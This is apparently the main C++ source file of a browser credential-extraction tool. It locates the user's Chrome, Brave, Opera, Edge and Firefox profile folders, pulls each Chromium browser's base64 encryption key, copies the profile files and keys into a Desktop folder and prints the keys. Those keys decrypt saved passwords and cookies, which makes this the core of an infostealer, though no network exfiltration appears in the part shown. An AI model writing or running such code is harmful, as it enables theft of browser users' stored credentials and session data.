#include <iostream>
#include "BrowserKeyExtract.h"
#include "utility.h"

int main()
{
	const std::string username { getusername() };
	std::vector<std::string> absolutePaths = makeAbsolutePaths(username, Browser::relativePaths);
	std::vector<std::string> chromePaths = extractPathsForSpecificBrowser(absolutePaths, "Google");
	std::vector<std::string> operaPaths = extractPathsForSpecificBrowser(absolutePaths, "Opera");
	std::vector<std::string> firefoxPaths = extractPathsForSpecificBrowser(absolutePaths, "Firefox");
	std::vector<std::string> edgePaths = extractPathsForSpecificBrowser(absolutePaths, "Edge");
	std::vector<std::string> bravePaths = extractPathsForSpecificBrowser(absolutePaths, "Brave");
	
	Browser chrome, opera, edge, firefox, brave;

	const std::string destinationPath{ "C:/Users/" + username + "/Desktop/BrowserData" };

	chrome.ExtractKey(chromePaths, Browser::CHROME_BASE64_KEY_LENGTH);
	chrome.WriteExtractedKeyToFile(destinationPath);
	chrome.ExtractFiles(chromePaths, destinationPath);

	brave.ExtractKey(bravePaths, Browser::BRAVE_BASE64_KEY_LENGTH);
	brave.WriteExtractedKeyToFile(destinationPath);
	brave.ExtractFiles(bravePaths, destinationPath);

	opera.ExtractKey(operaPaths, Browser::OPERA_BASE64_KEY_LENGTH);
	opera.ExtractFiles(operaPaths, destinationPath);
	opera.WriteExtractedKeyToFile(destinationPath);

	firefox.ExtractFiles(firefoxPaths, destinationPath);

	edge.ExtractKey(edgePaths, Browser::EDGE_BASE64_KEY_LENGTH);
	edge.ExtractFiles(edgePaths, destinationPath);
	edge.WriteExtractedKeyToFile(destinationPath);

	chrome.ShowKey();
	brave.ShowKey();
	opera.ShowKey();
	edge.ShowKey();

	return 0;
}